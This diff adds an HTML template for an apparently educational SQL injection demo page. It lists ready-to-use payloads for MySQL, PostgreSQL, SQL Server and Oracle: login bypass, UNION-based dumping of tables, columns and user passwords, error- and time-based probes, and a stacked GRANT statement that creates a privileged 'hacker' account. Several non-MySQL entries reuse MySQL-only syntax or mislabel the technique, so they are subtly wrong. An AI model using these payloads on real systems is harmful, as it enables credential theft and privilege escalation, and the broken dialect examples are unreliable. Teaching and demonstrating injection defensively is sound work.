@@ -1,0 +1,299 @@
+{% extends "base.html" %}
+
+{% block title %}SQL Injection Demo - Ejemplos{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-lg-10 mx-auto">
+        <div class="card shadow">
+            <div class="card-header bg-info text-white">
+                <h3 class="mb-0">
+                    <i class="fas fa-graduation-cap"></i> Ejemplos de SQL Injection
+                </h3>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <strong>⚠️ ADVERTENCIA:</strong> Estos ejemplos son para fines educativos únicamente. 
+                    No usar en sistemas de producción o con datos reales.
+                </div>
+
+                <!-- MySQL Examples -->
+                <div class="mb-4">
+                    <h4 class="text-primary">
+                        <i class="fas fa-database"></i> MySQL
+                    </h4>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card border-primary">
+                                <div class="card-header bg-primary text-white">
+                                    <h6 class="mb-0">Bypass de Autenticación</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>admin' OR '1'='1' --</code>
+                                    <br><small class="text-muted">Bypass de login</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-danger">
+                                <div class="card-header bg-danger text-white">
+                                    <h6 class="mb-0">Union Attack</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT 1,2,3,4,5 --</code>
+                                    <br><small class="text-muted">Extraer datos</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row mt-2">
+                        <div class="col-md-6">
+                            <div class="card border-warning">
+                                <div class="card-header bg-warning text-dark">
+                                    <h6 class="mb-0">Error Based</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --</code>
+                                    <br><small class="text-muted">Extraer información del sistema</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-info">
+                                <div class="card-header bg-info text-white">
+                                    <h6 class="mb-0">Time Based</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --</code>
+                                    <br><small class="text-muted">Detección ciega</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PostgreSQL Examples -->
+                <div class="mb-4">
+                    <h4 class="text-success">
+                        <i class="fas fa-database"></i> PostgreSQL
+                    </h4>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card border-success">
+                                <div class="card-header bg-success text-white">
+                                    <h6 class="mb-0">Bypass de Autenticación</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>admin' OR '1'='1' --</code>
+                                    <br><small class="text-muted">Bypass de login</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-danger">
+                                <div class="card-header bg-danger text-white">
+                                    <h6 class="mb-0">Union Attack</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT 1,2,3,4,5 --</code>
+                                    <br><small class="text-muted">Extraer datos</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row mt-2">
+                        <div class="col-md-6">
+                            <div class="card border-warning">
+                                <div class="card-header bg-warning text-dark">
+                                    <h6 class="mb-0">Error Based</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --</code>
+                                    <br><small class="text-muted">Extraer información del sistema</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-info">
+                                <div class="card-header bg-info text-white">
+                                    <h6 class="mb-0">Time Based</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' AND (SELECT pg_sleep(5)) --</code>
+                                    <br><small class="text-muted">Detección ciega</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SQL Server Examples -->
+                <div class="mb-4">
+                    <h4 class="text-warning">
+                        <i class="fas fa-database"></i> SQL Server
+                    </h4>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card border-warning">
+                                <div class="card-header bg-warning text-dark">
+                                    <h6 class="mb-0">Bypass de Autenticación</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>admin' OR '1'='1' --</code>
+                                    <br><small class="text-muted">Bypass de login</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-danger">
+                                <div class="card-header bg-danger text-white">
+                                    <h6 class="mb-0">Union Attack</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT 1,2,3,4,5 --</code>
+                                    <br><small class="text-muted">Extraer datos</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row mt-2">
+                        <div class="col-md-6">
+                            <div class="card border-warning">
+                                <div class="card-header bg-warning text-dark">
+                                    <h6 class="mb-0">Error Based</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --</code>
+                                    <br><small class="text-muted">Extraer información del sistema</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-info">
+                                <div class="card-header bg-info text-white">
+                                    <h6 class="mb-0">Time Based</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' WAITFOR DELAY '00:00:05' --</code>
+                                    <br><small class="text-muted">Detección ciega</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Oracle Examples -->
+                <div class="mb-4">
+                    <h4 class="text-danger">
+                        <i class="fas fa-database"></i> Oracle
+                    </h4>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card border-danger">
+                                <div class="card-header bg-danger text-white">
+                                    <h6 class="mb-0">Bypass de Autenticación</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>admin' OR '1'='1' --</code>
+                                    <br><small class="text-muted">Bypass de login</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-danger">
+                                <div class="card-header bg-danger text-white">
+                                    <h6 class="mb-0">Union Attack</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT 1,2,3,4,5 FROM DUAL --</code>
+                                    <br><small class="text-muted">Extraer datos</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row mt-2">
+                        <div class="col-md-6">
+                            <div class="card border-warning">
+                                <div class="card-header bg-warning text-dark">
+                                    <h6 class="mb-0">Error Based</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT banner FROM v$version WHERE rownum=1),0x7e,FLOOR(DBMS_RANDOM.VALUE(0,2)))x FROM dual GROUP BY x)a) --</code>
+                                    <br><small class="text-muted">Extraer información del sistema</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-info">
+                                <div class="card-header bg-info text-white">
+                                    <h6 class="mb-0">Time Based</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' AND (SELECT UTL_INADDR.GET_HOST_NAME('localhost') FROM DUAL WHERE ROWNUM=1) IS NOT NULL --</code>
+                                    <br><small class="text-muted">Detección ciega</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Advanced Examples -->
+                <div class="mb-4">
+                    <h4 class="text-dark">
+                        <i class="fas fa-rocket"></i> Ejemplos Avanzados
+                    </h4>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="card border-dark">
+                                <div class="card-header bg-dark text-white">
+                                    <h6 class="mb-0">Dump de Tablas</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT table_name,NULL,NULL,NULL,NULL FROM information_schema.tables --</code>
+                                    <br><small class="text-muted">Listar todas las tablas</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-dark">
+                                <div class="card-header bg-dark text-white">
+                                    <h6 class="mb-0">Dump de Columnas</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT column_name,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --</code>
+                                    <br><small class="text-muted">Listar columnas de una tabla</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row mt-2">
+                        <div class="col-md-6">
+                            <div class="card border-dark">
+                                <div class="card-header bg-dark text-white">
+                                    <h6 class="mb-0">Dump de Datos</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>' UNION SELECT username,password,email,NULL,NULL FROM users --</code>
+                                    <br><small class="text-muted">Extraer datos de usuarios</small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="card border-dark">
+                                <div class="card-header bg-dark text-white">
+                                    <h6 class="mb-0">Escalación de Privilegios</h6>
+                                </div>
+                                <div class="card-body">
+                                    <code>'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password'; --</code>
+                                    <br><small class="text-muted">Crear usuario con privilegios</small>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %} 
